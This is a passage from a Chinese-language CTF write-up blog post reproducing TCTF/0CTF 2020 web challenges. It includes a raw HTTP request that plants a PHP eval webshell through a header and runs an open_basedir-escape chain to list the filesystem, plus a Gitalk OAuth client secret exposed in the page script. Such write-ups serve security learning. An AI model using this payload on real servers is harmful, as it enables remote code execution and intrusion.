+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;eval(end(getallheaders())); HTTP&#x2F;1.1</span><br><span class="line">Host: pwnable.org:47780</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.149 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7,zh-TW;q&#x3D;0.6</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 241</span><br><span class="line">Connection: eval($_POST[cmd]);</span><br><span class="line"></span><br><span class="line">cmd&#x3D;chdir(&#39;sandbox&#x2F;0d3875a1ef234783393169ab868290f038826727&#x2F;&#39;);mkdir(&quot;img&quot;);chdir(&quot;img&quot;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);var_dump(scandir(&#39;&#x2F;&#39;));</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200707210915967.png" alt="image-20200707210915967"></p>
+<p>然后读flag。是乱码，看wp说是用foremost得到flag，没有试成功。</p>
+<h1 id="0x05-Cloud-Computing-v2"><a href="#0x05-Cloud-Computing-v2" class="headerlink" title="0x05 Cloud Computing v2"></a>0x05 Cloud Computing v2</h1><blockquote>
+<p>var_dump(get_defined_functions(1));可以得到可用的函数。</p>
+</blockquote>
+<p>web go逆向，代码同上一题，禁了<code>chdir、chr、dir、scandir、mb_send_mail、ob_end_clean、ob_get_contents、ob_start、readdir、realpath</code>这些函数。</p>
+<p>不能用chdir来绕过open_basedir。内网开了80端口，</p>
+<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200707222532253.png" alt="image-20200707222532253"></p>
+<p>下载/agent</p>
+<p>之后就是逆向了。。。。。。。。。。。。。。。。</p>
+<h1 id="0x06-amp2020"><a href="#0x06-amp2020" class="headerlink" title="0x06 amp2020"></a>0x06 amp2020</h1><p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200706211703521.png" alt="image-20200706211703521"></p>
+<p><a href="http://pwnable.org:33000/users/login" target="_blank" rel="noopener">http://pwnable.org:33000/users/login</a></p>
+<p>参考</p>
+<p><a href="https://skysec.top/2020/06/27/2020-TCTF-Online-Web-WriteUp/" target="_blank" rel="noopener">https://skysec.top/2020/06/27/2020-TCTF-Online-Web-WriteUp/</a></p>
+<p><a href="http://igml.top/2020/06/29/2020-TCTF-0CTF-部分wp/" target="_blank" rel="noopener">http://igml.top/2020/06/29/2020-TCTF-0CTF-%E9%83%A8%E5%88%86wp/</a></p>
+<p><a href="https://cjm00n.top/CTF/tctf-2020-wp.html" target="_blank" rel="noopener">https://cjm00n.top/CTF/tctf-2020-wp.html</a></p>
+
+      
+    </div>
+  </div>
+  <!-- 要添加的内容 -->
+  
+    <div>
+        <ul class="post-copyright">
+          <li class="post-copyright-author">
+          <strong>作者:  </strong>Mount4in</a>
+          </li>
+          <li class="post-copyright-link">
+          <strong>文章链接:  </strong>
+          <a href="/2020/07/01/2020TCTF0CTFWeb题目复现/" target="_blank" title="2020 TCTF0CTF Web题目复现">http://mount4in.github.io/2020/07/01/2020TCTF0CTFWeb题目复现/</a>
+          </li>
+          <li class="post-copyright-license">
+            <strong>版权声明:   </strong>
+            本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+            许可协议。转载请注明出处!
+          </li>
+        </ul>
+      <div>
+
+  
+  <!---->
+    <footer class="article-footer">
+      <a data-url="http://mount4in.github.io/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" data-id="clg20p62r002q14uv4sf0elsj"
+         class="article-share-link">Share</a>
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+
+    </footer>
+
+
+
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer</strong>
+        <div class="article-nav-title">
+          
+            2020SCTFWeb题目复现
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/" class="article-nav-link">
+        <strong class="article-nav-caption">Older</strong>
+        <div class="article-nav-title">第五空间智能安全大赛Web题解</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+
+  
+    
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: 'b7d32ae2538e1a71f462',
+      clientSecret: 'da0452b610458a4ccbc38598fb0d02f0eb9e653d',
+      repo: 'gitalk',
+      owner: 'Mount4in',
+      admin: ['Mount4in'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2023 Mount4in</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="Mount4in"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
